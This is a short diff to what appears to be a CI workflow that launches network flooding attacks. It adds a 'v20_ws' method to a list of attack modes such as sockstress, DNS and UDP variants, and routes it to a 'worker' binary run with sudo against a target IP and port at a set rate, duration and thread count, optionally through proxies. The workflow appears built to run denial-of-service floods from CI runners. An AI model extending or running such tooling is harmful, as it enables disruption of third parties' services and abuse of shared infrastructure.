@@ -30,6 +30,7 @@ on:
           - sockstress_v15
           - dns_v16
           - stealth
+          - v20_ws
           - v19_tcp
           - fjium-dns
           - fjium-gudp
@@ -170,7 +171,7 @@ jobs:
           fi
         fi
         
-        if [ "$METHOD" = "dns_v16" ] || [ "$METHOD" = "stealth" ] || [ "$METHOD" = "v19_tcp" ]; then
+        if [ "$METHOD" = "dns_v16" ] || [ "$METHOD" = "stealth" ] || [ "$METHOD" = "v19_tcp" ] || [ "$METHOD" = "v20_ws" ]; then
           sudo ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG
         else
           sudo sh -c "cpulimit -l 50 -f -- ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
